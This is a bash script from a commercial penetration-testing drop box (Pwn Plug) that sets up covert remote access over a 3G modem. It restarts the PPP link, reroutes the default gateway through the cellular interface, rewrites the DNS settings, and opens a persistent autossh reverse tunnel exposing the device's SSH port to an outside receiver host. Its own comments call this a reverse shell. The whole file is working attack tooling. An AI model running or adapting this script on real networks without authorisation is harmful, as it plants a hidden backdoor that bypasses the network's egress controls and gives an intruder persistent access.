#!/bin/bash
# Copyright 2010-2015 Rapid Focus Security, LLC
# pwnieexpress.com
#
# This script contains proprietary software distributed under the terms of the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Use of this software signifies your agreement to the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Rapid Focus Security, LLC EULA: http://pwnieexpress.com/pdfs/RFSEULA.pdf
#
# Revision: 4.26.2012

# Get user variables from script_configs
# PPP_peer=[Unlocked 3G adapter = e160, Verizon/Virgin Mobile = 1xevdo, T-mobile Rocket 4G = tmobile]
# SSH_receiver=
# 3Gtunnel_receiver_port=
. /var/pwnplug/script_configs/reverse_ssh_over_3G_config.sh

# Set SSH variables
SSH_listener_port=3337
SSH_user=pwnplug
SSH_key="/root/.ssh/id_rsa"
Tunnel_status=`ps -C ssh -o pid,args |grep -o "${SSH_listener_port}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${SSH_listener_port}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${SSH_listener_port}:localhost:22" |awk '{print$1}'`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=22086
export AUTOSSH_PIDFILE=/var/run/3G_autossh.pid

# Help keep any existing 3G connections alive
ping 8.8.8.8 -c 2

# If already connected, do nothing.
# If not, attempt connect and set default route to use 3G/GSM gateway.

if [ "${Tunnel_status}" == "${SSH_listener_port}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \

# Restart pppd connection
killall -s SIGHUP pppd ; \
sleep 4 ; \
killall -9 pppd ; \
pppd call "$PPP_peer" & \
sleep 15 ; \

# Check connection status
ppp_status=`ifconfig |grep -o "^ppp0"`

# If ppp0 is up, set ppp0 as default gateway
if [ "$ppp_status" == "ppp0" ] ; then \
route del default gw 0.0.0.0 ; \
route del default gw 0.0.0.0 ; \
route add default ppp0 ; \
echo "nameserver 8.8.8.8" > /etc/resolv.conf ; \
sleep 2 ; \

# Attempt reverse shell connection
autossh -2NR ${SSH_listener_port}:localhost:22 -i "${SSH_key}" "${SSH_user}"@"${SSH_receiver}" -p "${SSH_receiver_port}"; \

else echo "No 3G connection" ; \
fi

fi
